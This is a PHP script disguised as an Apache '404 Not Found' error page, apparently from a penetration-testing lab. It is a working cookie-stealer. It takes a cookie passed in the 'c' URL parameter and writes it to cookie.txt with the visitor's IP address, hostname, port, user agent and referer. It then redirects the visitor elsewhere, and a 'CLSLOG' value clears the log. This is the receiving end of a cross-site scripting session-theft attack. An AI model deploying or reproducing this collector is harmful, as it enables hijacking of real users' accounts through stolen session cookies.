<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<?php
header ('Location:http://www.penterepmail.loc/inc/search.php?query=admin');
	$cookies = $_GET["c"];
	if($cookies!='CLSLOG'){
		$date = date('Y/m/d H:i:s');
		$protocol = $_SERVER['SERVER_PROTOCOL'];
		$ip = $_SERVER['REMOTE_ADDR'];
		$port = $_SERVER['REMOTE_PORT'];
		$agent = $_SERVER['HTTP_USER_AGENT'];
		$ref = $_SERVER['HTTP_REFERER'];
		$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
		$file = fopen('cookie.txt','a');
		fwrite($file, 'Date and Time: '."".$date ."\n");
		fwrite($file, 'IP Address: '."".$ip ."\n");
		fwrite($file, 'Hostname: '."".$hostname ."\n");
		fwrite($file, 'Port Number: '."".$port ."\n");
		fwrite($file, 'User Agent: '."".$agent ."\n");
		fwrite($file, 'HTTP Referer: '."".$ref ."\n");
		fwrite($file,"Cookie - ".$cookies."\n\n");
	}else{
		file_put_contents("cookie.txt", "");
	}
?>
<address>Apache/2.4.46 (Debian) Server at 10.0.2.15 Port 80</address>
</body></html>
